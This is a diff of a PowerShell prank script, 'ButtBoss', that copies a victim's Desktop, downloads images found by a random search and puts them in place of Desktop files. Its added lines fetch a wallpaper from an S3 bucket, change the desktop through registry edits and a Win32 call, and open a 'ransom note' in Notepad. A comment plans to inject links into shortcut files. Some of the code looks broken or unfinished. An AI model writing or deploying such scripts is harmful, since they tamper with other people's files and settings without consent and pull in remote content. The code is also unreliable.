@@ -1,16 +1,20 @@
-
+# Old test-path version to find the desktop
 # Set Desktop Path, switch to OneDrive path format if OneDrive folder exists, and run ButtBoss
-$desktop = "$home\Desktop"
-if((Test-Path $env:OneDrive) -Or (Test-Path $env:OneDriveCommercial)) {
-    $desktop = "$env:OneDrive\Desktop"
-}
+# $desktop = "$home\Desktop"
+# if((Test-Path $env:OneDrive) -Or (Test-Path $env:OneDriveCommercial)) {
+#     $desktop = "$env:OneDrive\Desktop"
+# }
+
+# StackOverflow replacement to always get the right Desktop path
+$desktop = [Environment]::GetFolderPath([Environment+SpecialFolder]::Desktop)
+ 
 # Copy Desktop Contents to Goofin for safe keepin
 Copy-Item -Path $desktop -Destination "C:\Goofin\cuts" -Recurse -Force
 
 # enumerate targets for replacement & grab number of butts needed for grand plan
-$targets = gci $desktop -Recurse
-$buttlist = (echo $targets | Get-Member)
-$buttcount = $buttlist.Count
+$targets = Get-ChildItem $desktop
+$buttList = ($targets | Get-Content)
+$buttCount = $buttList.Count
 
 # seed array from text file and pulls an entry at random, converts to a string and returns
 $seeds = Get-Content .\buttseeds.txt
@@ -19,13 +23,13 @@ foreach ($s in $seeds)
  {
   $hash.add($s,(Get-Random -Maximum $seeds.count))
  }
-$hash.GetEnumerator() | Get-Random -OutVariable buttseed
-$buttseed | out-string | echo
+$hash.GetEnumerator() | Get-Random -OutVariable buttSeed
+$buttSearch = $buttSeed.Name
 
-# script parameters, feel free to change it 
+# script parameters
 $downloadFolder = "C:\Goofin\butts"
-$searchFor =  "sexy ass butts" # $buttseed
-$nrOfImages = $buttcount
+$searchFor =  $buttSearch
+$numImages = $buttCount
 
 # create a WebClient instance that will handle Network communications 
 $webClient = New-Object System.Net.WebClient
@@ -35,7 +39,7 @@ Add-Type -AssemblyName System.Web
 
 # URL encode our search query
 $searchQuery = [System.Web.HttpUtility]::UrlEncode($searchFor)
-$url = "http://www.bing.com/images/search?q=$searchQuery&first=0&count=$nrOfImages&qft=+filterui%3alicense-L2_L3_L4"
+$url = "http://www.bing.com/images/search?q=$searchQuery&first=0&count=$numImages&qft=+filterui%3alicense-L2_L3_L4"
 
 # Grab HTML from response
 $webpage = $webclient.DownloadString($url)
@@ -95,26 +99,75 @@ foreach($file in $filesToReplace)
     {
         write-warning "Original File, $originalFile , is not found" 
     }
-
     if(Test-Path $file)
     {
         Write-Host "$file is renamed to $originalFile"
         Rename-Item $file $originalFile -force
     }
 }
-
-
-
 # Create array of the photos in butts, choose a random one and replace for each .lnk file
-
-# Stretch Goal play with injecting links into the lnk files for other funny things, or have it inject a URL for a randomized search from the buttsedd list
+# play with injecting links into the lnk files for other funny things, or have it inject a URL for a randomized search from the buttsedd list
 
 # Hit 'em with it
+# retrieve background image from S3 
+$buttGrab = Invoke-WebRequest -uri "https://buttboss.s3.us-east-1.amazonaws.com/butt-wall-paper.jpg" -OutFile $downloadFolder\background.jpg
+$buttBackground = $downloadFolder\background.jpg
+
+Function Set-WallPaper ($Image = $buttBackground) {
+param (
+    [parameter(Mandatory=$True)]
+    # Provide path to image
+    [string]$Image,
+    # Provide wallpaper style that you would like applied
+    [parameter(Mandatory=$False)]
+    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
+    [string]$Style
+)
+ 
+$WallpaperStyle = Switch ($Style) { 
+    "Fill" {"10"}
+    "Fit" {"6"}
+    "Stretch" {"2"}
+    "Tile" {"0"}
+    "Center" {"0"}
+    "Span" {"22"}  
+}
+ 
+If($Style -eq "Tile") {
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force 
+}
+Else {
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force 
+}
+ 
+Add-Type -TypeDefinition @" 
+using System; 
+using System.Runtime.InteropServices;
+  
+public class Params
+{ 
+    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
+    public static extern int SystemParametersInfo (Int32 uAction, 
+                                                   Int32 uParam, 
+                                                   String lpvParam, 
+                                                   Int32 fuWinIni);
+}
+"@ 
+  
+    $SPI_SETDESKWALLPAPER = 0x0014
+    $UpdateIniFile = 0x01
+    $SendChangeEvent = 0x02
+  
+    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+  
+    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+}
+
+# Write the ransom note, pop notepad, Invoke-Chills
 echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt" 
 notepad "C:\Goofin\buttbossin.txt"   
-
-
-# Ghost Protocols
 
 # Politeness Module
 # Reset the photots and icons after within 24 hours.
